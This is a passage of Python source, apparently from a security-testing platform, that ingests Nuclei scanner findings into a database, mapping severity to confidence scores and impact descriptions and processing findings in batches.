    db.add(finding)
    await db.flush()
    logger.info(f"Ingested finding: {finding.title} [{finding.severity.value}] -> asset={asset_id}"
                f" tags={triage_tags}")
    return finding


def _confidence_from_severity(severity: FindingSeverity) -> int:
    """Map severity to confidence score."""
    return {
        FindingSeverity.CRITICAL: 95,
        FindingSeverity.HIGH: 85,
        FindingSeverity.MEDIUM: 70,
        FindingSeverity.LOW: 50,
        FindingSeverity.INFO: 30,
    }.get(severity, 30)


def _build_description(raw_finding: dict) -> str:
    """Extract description from Nuclei finding."""
    info = raw_finding.get("info", {})
    if isinstance(info, dict):
        return info.get("description", "")[:2000]
    return ""


def _infer_impact(severity: FindingSeverity, category: str) -> str:
    """Infer impact string from severity and category."""
    if severity in (FindingSeverity.CRITICAL, FindingSeverity.HIGH):
        if category in ("idor", "access_control", "auth_bypass"):
            return "Critical access control vulnerability could allow unauthorized data access or privilege escalation"
        if category == "sensitive_data":
            return "Sensitive data exposure could lead to credential theft or account compromise"
        return f"High-severity {category} vulnerability could lead to significant security impact"
    if severity == FindingSeverity.MEDIUM:
        return f"Medium-severity {category} issue that should be addressed"
    return f"Low-severity {category} finding for awareness"


async def ingest_nuclei_findings_batch(
    db: AsyncSession,
    engagement_id: str,
    project_id: str,
    user_id: str,
    scan_id: Optional[str],
    raw_findings: list[dict],
    asset_id: Optional[str] = None,
    auth_headers: Optional[dict] = None,
) -> list[Finding]:
    """Ingest a batch of Nuclei findings.

    Phase 5: Passes auth_headers through for PoC generation of high-severity findings.

    Args:
        db: AsyncSession
        engagement_id: The engagement UUID
        project_id: The project UUID
        user_id: The user UUID
        scan_id: The VulnerabilityScan UUID (optional)
        raw_findings: List of Nuclei finding dicts
        asset_id: Pre-resolved Asset UUID (optional)
        auth_headers: Auth headers used for the scan (for PoC generation)

    Returns:
        List of Finding records (new or updated)
    """
    findings = []
    for raw in raw_findings:
        try:
            finding = await ingest_nuclei_finding(
                db=db,
                engagement_id=engagement_id,
                project_id=project_id,
                user_id=user_id,
                scan_id=scan_id,
                raw_finding=raw,
                asset_id=asset_id,
                auth_headers=auth_headers,
            )
            findings.append(finding)
        except Exception as e:
            logger.warning(f"Failed to ingest finding: {e}")
            continue

    await db.commit()
    logger.info(f"Batch ingest complete: {len(findings)}/{len(raw_findings)} findings ingested")
    return findings
